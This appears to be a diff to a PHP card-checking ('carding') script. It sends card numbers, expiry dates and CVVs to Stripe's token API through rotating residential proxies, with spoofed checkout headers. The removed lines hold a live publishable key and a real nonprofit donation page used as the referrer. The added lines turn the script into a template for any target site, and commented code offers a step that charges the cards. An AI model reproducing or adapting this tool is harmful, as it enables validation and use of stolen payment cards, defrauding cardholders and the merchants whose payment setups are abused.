@@ -55,13 +55,13 @@ $phone = $matches1[1][0];
 preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
 $postcode = $matches1[1][0];
 
-////////////////////////////===[Luminati Details]
+////////////////////////////===[Your proxy api site]
 
 $username = 'Put Zone Username Here';
 $password = 'Put Zone Password Here';
-$port = 22225;
+$port = api port;
 $session = mt_rand();
-$super_proxy = 'zproxy.lum-superproxy.io';
+$super_proxy = ' #api site url#';
 
 ////////////////////////////===[For Authorizing Cards]
 
@@ -75,12 +75,12 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json', 
-'accept-language: en-US',
-'accept-encoding: gzip, deflate, br',
-'content-type: application/x-www-form-urlencoded',
-'origin: https://checkout.stripe.com',
-'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=4eb2ef73-040f-d2c5-a0d7-8c708c262c32',
+'accept: ', 
+'accept-language: ',
+'accept-encoding: ',
+'content-type: ',
+'origin:       ',
+'referer:      ',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site'));
 //'user-agent: #'));
@@ -90,15 +90,15 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fportland.scrapcreativereuse.org%2Fdonate%2Fitems-we-accept%2F%3Futm_content%3Dbuffere282f%26utm_medium%3Dsocial%26utm_source%3Dplus.google.com%26utm_campaign%3Dbuffer&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$email.'&time_on_page=18416&guid=17583cc9-7646-4f73-ba1a-408931871912&muid=26777036-c852-418d-a6c5-64766e94ff66&sid=9191f10d-8219-4a97-b63d-a25d04ab4a86&key=pk_live_9DUA63QRT1NfzluWp2vrtu0z');
-
+curl_setopt($ch, CURLOPT_POSTFIELDS, ' your post feild here  ');
+//// add headers if site have more
 $result = curl_exec($ch);
 // $token = trim(strip_tags(getStr($result,'"id": "','"')));
 
 ////Uncomment this section for using 2req////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]
 
 // $ch = curl_init();
-// /////////========Luminati
+// /////////========Proxy zones
 // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 // ////////=========Socks Proxy
@@ -110,15 +110,15 @@ $result = curl_exec($ch);
 // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 // curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 // curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-//   'Host: '#',    [If No Host Data On Site Dont Uncomment It]  
-//   'accept: '#',
-//   'content-type: #',
-//   'cookie: #',   [If No Cookie Data On Site Dont Uncomment It]
-//   'Origin: #',
-//   'referer: #',
-//   'Sec-Fetch-Mode: #',
+//   'Host: '   ',    [If No Host Data On Site Dont Uncomment It]  
+//   'accept: '  ',
+//   'content-type:  ',
+//   'cookie:  ',   [If No Cookie Data On Site Dont Uncomment It]
+//   'Origin:  ',
+//   'referer: ',
+//   'Sec-Fetch-Mode: ',
 // ));
-// curl_setopt($ch, CURLOPT_POSTFIELDS, '#');
+// curl_setopt($ch, CURLOPT_POSTFIELDS, ' your post feild here');
 
 // $result = curl_exec($ch);
 // $message = trim(strip_tags(getStr($result,'"message":"','"'))); 
